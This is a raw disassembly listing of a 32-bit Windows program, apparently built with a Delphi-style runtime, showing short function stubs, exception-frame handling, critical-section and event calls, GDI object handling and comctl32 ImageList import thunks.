push sub_41edb8
lea eax [ ebp - 0x1c ]
call sub_405ab8
lea eax [ ebp - 0x18 ]
call sub_404118
retn
sub_41edb1
jmp sub_403a98
sub_41edb8
pop ebx
mov esp ebp
pop ebp
retn
sub_41efca
jmp sub_403a98
sub_41efd1
pop ebx
mov esp ebp
pop ebp
retn
sub_41f004
mov eax [ eax + 0x30 ]
call sub_418b9c
retn
sub_41f074
call sub_41f1a4
retn
sub_41f0b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41c10c
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41f193
jmp sub_403a98
sub_41f19a
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41f1a4
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41b758
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41f1bc
test dl dl
je r-xdata
mov dl 0x8
call sub_421328
retn
mov dl 0x9
call sub_421328
retn
sub_41f213
jmp sub_403a98
sub_41f21a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f2b2
jmp sub_403a98
sub_41f2b9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f457
jmp sub_403a98
sub_41f45e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f79f
jmp sub_403a98
sub_41f7e1
jmp sub_403a98
sub_41f840
jmp sub_403a98
sub_41f847
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41faac
mov dl 0x1
call sub_421328
retn
sub_41fab4
xor edx edx
call sub_421328
retn
sub_41fbad
jmp sub_403a98
sub_41fd83
jmp sub_403a98
sub_41fd8a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ff58
jmp sub_403a98
sub_41ff5f
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420035
jmp sub_403a98
sub_42003c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_420153
jmp sub_403a98
sub_42015a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_420314
jmp sub_403a98
sub_42031b
pop ecx
pop ebp
retn
sub_4203a6
jmp sub_403a98
sub_4203ad
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420414
jmp sub_403a98
sub_42041b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420499
jmp sub_403a98
sub_4204a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4204bd
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4204b6
jmp sub_403a98
sub_4204bd
pop ebx
pop ecx
pop ebp
retn
sub_420578
jmp sub_403a98
sub_42057f
pop ebx
pop ecx
pop ebp
retn
sub_420655
jmp sub_403a98
sub_42065c
pop ecx
pop ebp
retn
sub_420660
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_420767
jmp sub_403a98
sub_42076e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420915
jmp sub_403a98
sub_420994
jmp sub_403a98
sub_42099b
mov esp ebp
pop ebp
retn
sub_420a69
jmp sub_403a98
sub_420a70
pop ebx
mov esp ebp
pop ebp
retn
sub_420b23
jmp sub_403a98
sub_420b2a
pop ebx
mov esp ebp
pop ebp
retn
sub_420b89
jmp sub_403a98
sub_420b90
mov esp ebp
pop ebp
retn
sub_420ff5
jmp sub_403a98
sub_42104f
jmp sub_403a98
sub_421060
jmp sub_4037e4
sub_4210bc
jmp sub_403a98
sub_4210c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421122
jmp sub_403a98
sub_421129
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_421130
mov edx rw-data
mov ecx 0x4
call sub_41f0d0
retn
sub_421265
jmp sub_403a98
sub_42126c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42131a
jmp sub_403a98
sub_421321
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421360
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40d2b8
sub_421394
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_4213ac
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_4213b8
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_4213ac
sub_4213d4
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_4213e0
push rw-data
call InterlockedIncrement
retn
sub_4213ec
push rw-data
call InterlockedDecrement
retn
sub_421502
jmp sub_4037e4
sub_421531
jmp sub_403a98
sub_421567
jmp sub_403a98
sub_42156e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42158d
push rw-data
call LeaveCriticalSection
retn
sub_421586
jmp sub_403a98
sub_42158d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4215d9
jmp sub_4037e4
sub_4216ea
jmp sub_403a98
sub_4216f1
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_421778
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_4219a8
sub_4217f2
jmp sub_403a98
sub_4217f9
pop ebx
mov esp ebp
pop ebp
retn
sub_421818
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_42182c
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_421818
call sub_421980
sub_421925
jmp sub_403a98
sub_42192c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42194b
push rw-data
call LeaveCriticalSection
retn
sub_421944
jmp sub_403a98
sub_42194b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_421962
jmp sub_403a98
sub_4219d0
mov [ eax + 0xd ] 0x1
retn
sub_421b40
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_421d1c
sub_421ba0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d7c8
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_421bb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d7c8
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_421bc8
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f9e0
retn
sub_421bd4
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f9e0
retn
sub_421e7c
xor eax eax
retn
sub_421e80
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421e88
xor eax eax
retn
sub_421e8c
retn
sub_421e90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40416c
pop esi
pop ebx
retn
sub_421ea4
mov eax [ eax + 0x4 ]
retn
sub_421ea8
retn
sub_421eac
xor eax eax
retn
sub_421eb0
retn
sub_421eb4
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_421ec0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_421ecc
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_421ed8
retn
sub_421edc
xchg edx eax
call sub_41d46c
retn
sub_421ee4
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_421f6c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403518
pop esi
retn
sub_421f80
retn
sub_422060
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
sub_4220a0
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4221ec
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_40354c
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_422204
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_42228c
retn
sub_4222d4
retn
sub_42230c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_422324
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_422548
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403518
pop esi
pop ebx
retn
sub_42236c
mov al 0x1
retn
sub_422370
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_422378
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_422420
xor eax eax
retn
sub_422424
retn
sub_422450
retn
sub_4224e8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4224fc
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_418b9c
retn
sub_422643
jmp sub_4037e4
sub_422648
mov ebx 0x1
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4226ab
jmp sub_4037e4
sub_4226b0
mov ebx 0x80030103
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42272e
jmp sub_4037e4
sub_422733
mov ebx 0x80030009
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_422791
jmp sub_4037e4
sub_422796
mov ebx 0x8000ffff
call sub_403b4c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422961
jmp sub_403a98
sub_422972
jmp sub_4037e4
sub_422977
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229a0
lea eax [ ebp + 0xc ]
call sub_405ab8
retn
sub_422999
jmp sub_403a98
sub_4229a0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_4229ac
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4229b8
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_4229c4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4229d0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_422a3f
jmp sub_4037e4
sub_422a44
mov esi 0x8000ffff
call sub_403b4c
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422a58
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_422ac5
jmp sub_403a98
sub_422acc
mov eax [ rw-data ]
call sub_40331c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_422adc
call sub_4182e0
retn
sub_422ba4
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_422d48
jmp sub_403a98
sub_422d4f
pop ebp
retn
sub_422ddd
jmp sub_403a98
sub_422de4
pop ebp
retn
sub_4230ad
jmp sub_403a98
sub_4230b4
pop ebp
retn
sub_4230b8
sub [ rw-data ] 0x1
retn
sub_4238df
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
sub_423d70
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_423de4
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_423e58
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423e64
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423f44
jmp sub_403a98
sub_423f4b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423fdb
jmp sub_403a98
sub_42406d
jmp sub_403a98
sub_424074
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4240d8
jmp sub_403a98
sub_4240df
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424147
jmp sub_403a98
sub_42414e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4241f1
jmp sub_403a98
sub_4241f8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424650
push 0x33
mov ecx rw-data
call sub_41861c
retn
sub_424660
push 0x33
mov ecx rw-data
call sub_4185dc
retn
sub_424670
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_424694
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_424868
push 0x11
mov ecx rw-data
call sub_4185dc
retn
sub_4249a8
push ebx
mov ebx eax
mov eax ebx
call sub_424670
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_424a62
jmp sub_403a98
sub_424a69
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424694
retn
sub_424a7f
jmp sub_403a98
sub_424a98
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424af5
jmp sub_403a98
sub_424afc
pop ebx
pop ecx
pop ebp
retn
sub_424c75
jmp sub_403a98
sub_424c9d
jmp sub_403a98
sub_424ca4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_424d10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40437c
pop esi
pop ebx
retn
sub_424d84
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_424ce0
push eax
call MulDiv
neg eax
pop ebx
retn
sub_424dc0
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_424df8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_424e28
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_424f46
jmp sub_403a98
sub_424f4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424694
retn
sub_424f63
jmp sub_403a98
sub_424fd9
jmp sub_403a98
sub_424fe0
pop ebx
pop ecx
pop ebp
retn
sub_424fe4
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_42509a
jmp sub_403a98
sub_4250ac
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403518
sub_4250c0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4250f0
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_4251ff
jmp sub_403a98
sub_425206
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424694
retn
sub_42521c
jmp sub_403a98
sub_425295
jmp sub_403a98
sub_42529c
pop ebx
pop ecx
pop ebp
retn
sub_4253cd
jmp sub_403a98
sub_4253e0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_425720
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_4259b4
jmp sub_403a98
sub_4259bb
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4259c4
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_4259fc
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_425b48
retn
sub_425c11
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_425c28
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_425d14
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425d34
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425d54
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425d74
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
pop ebx
retn
sub_425d8c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
pop ebx
retn
sub_425db0
mov eax [ rw-data ]
call sub_425d8c
retn
sub_425e06
jmp sub_403a98
sub_425e0d
pop ecx
pop ebp
retn
sub_425eac
jmp sub_403a98
sub_425eb3
pop ebx
mov esp ebp
pop ebp
retn
sub_425f85
jmp sub_403a98
sub_426016
jmp sub_403a98
sub_42601d
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426048
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_42612f
jmp sub_403a98
sub_4262dc
jmp sub_403a98
sub_4262e3
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_4264f5
jmp sub_403a98
sub_4264fc
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_426596
jmp sub_403a98
sub_426772
jmp sub_403a98
sub_42682c
jmp sub_403a98
sub_426833
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426853
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42684c
jmp sub_403a98
sub_426853
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4269e1
jmp sub_403a98
sub_426bac
jmp sub_403a98
sub_426bb3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426bd6
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_40270c
retn
sub_426bcf
jmp sub_403a98
sub_426bd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426bf6
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
sub_426bef
jmp sub_403a98
sub_426bf6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_426d48
push 0x0
call sub_426ce4
retn
sub_426ded
jmp sub_403a98
sub_426df4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_426e00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_426d50
pop ebx
pop ebp
retn 0x4
sub_426e14
retn
sub_426e18
test eax eax
jne r-xdata
retn
call sub_426e14
sub_426feb
jmp sub_403a98
sub_427012
jmp sub_403a98
sub_427019
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427058
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_427225
mov eax [ ebp - 0xc ]
call sub_40331c
retn
sub_42722e
jmp sub_403a98
j_sub_427225
jmp sub_427225
sub_427235
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40331c
retn
sub_42724b
jmp sub_403a98
sub_42725c
xor eax eax
retn
sub_427260
mov al [ eax + 0x21 ]
retn
sub_4272ac
jmp sub_403a98
sub_4272b3
pop esi
pop ecx
pop ebp
retn
sub_4272e0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_427337
jmp sub_403a98
sub_42733e
pop esi
pop ecx
pop ebp
retn
sub_427344
retn
sub_427348
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_427358
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_427476
jmp sub_403a98
sub_42749e
jmp sub_403a98
sub_4274a5
mov esp ebp
pop ebp
retn
sub_42751c
jmp sub_403a98
sub_427624
jmp sub_403a98
sub_42770f
jmp sub_403a98
sub_42771c
inc [ eax + 0x4 ]
retn
sub_427897
jmp sub_403a98
sub_427c48
jmp sub_403a98
sub_427e92
jmp sub_403a98
sub_427ebc
jmp sub_403a98
sub_427ec3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427ee5
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_427ede
jmp sub_403a98
sub_427eef
jmp sub_4037e4
sub_427f3e
jmp sub_403a98
sub_42816b
jmp sub_403a98
sub_4281b3
jmp sub_403a98
sub_428320
jmp sub_403a98
sub_4283e7
jmp sub_4037e4
sub_42843c
mov [ eax + 0x31 ] 0x0
call sub_427058
retn
sub_42868d
jmp sub_403a98
sub_4286f8
jmp sub_403a98
sub_4286ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428770
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_428824
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_428834
push ebx
mov ebx eax
mov eax ebx
call sub_4289ec
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_428848
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_428864
push ebx
mov ebx eax
mov eax ebx
call sub_428a4c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4288c0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4289cf
jmp sub_403a98
sub_428c33
jmp sub_4037e4
sub_428c93
jmp sub_403a98
sub_428c9a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42907b
jmp sub_403a98
sub_4290a7
jmp sub_403a98
sub_42910e
jmp sub_4037e4
sub_42913f
jmp sub_403a98
sub_4291c4
jmp sub_4037e4
sub_4291c9
mov eax [ ebp - 0x38 ]
call sub_40331c
call sub_403af8
call sub_403b4c
sub_4291db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4291f8
mov eax [ ebp - 0x18 ]
call sub_40270c
retn
sub_4291f1
jmp sub_403a98
sub_429347
jmp sub_4037e4
sub_429613
jmp sub_4037e4
sub_4296a4
mov cl 0x1
call sub_4296ac
retn
sub_429961
add [ eax ] al
add [ ebx ] dh
leave
call sub_4296ac
retn
sub_4299e6
jmp sub_4037e4
sub_4299eb
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403af8
call sub_403b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429a3c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_429b75
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_429ba4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_429bb8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_429cd1
jmp sub_4037e4
sub_429d86
jmp sub_4037e4
sub_429df0
jmp sub_4037e4
sub_429e24
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_429db0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_429e3c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425d74
retn
mov [ eax + 0x30 ] edx
retn
sub_429e54
retn
sub_429e58
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425d74
retn
mov [ eax + 0x2c ] edx
retn
sub_429e98
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425d74
pop ebp
retn 0x4
sub_429eac
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425d74
pop ebp
retn 0x4
sub_42a06c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42a078
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42a125
jmp sub_403a98
sub_42a12c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a217
jmp sub_4037e4
sub_42a283
jmp sub_403a98
sub_42a3b1
jmp sub_403a98
sub_42a3b8
pop ebp
retn
sub_42a4b8
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_42a4ed
jmp sub_403a98
sub_42a4f4
pop ebp
retn
sub_42a4f8
sub [ rw-data ] 0x1
retn
sub_42a740
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_418cf8
retn
sub_42a774
mov eax [ eax + 0x4 ]
call sub_418b9c
retn
sub_42a7a5
jmp sub_403a98
sub_42a7ac
pop ebp
retn
sub_42a7b0
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ InitCommonControls@IAT ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ __import_lookup_table_13(comctl32:ImageList_GetBkColor) ]
sub_42a898
shl eax 0x8
retn
ImageList_Remove
jmp [ __import_lookup_table_13(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_13(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_13(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ __import_lookup_table_13(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ __import_lookup_table_13(comctl32:ImageList_Write) ]
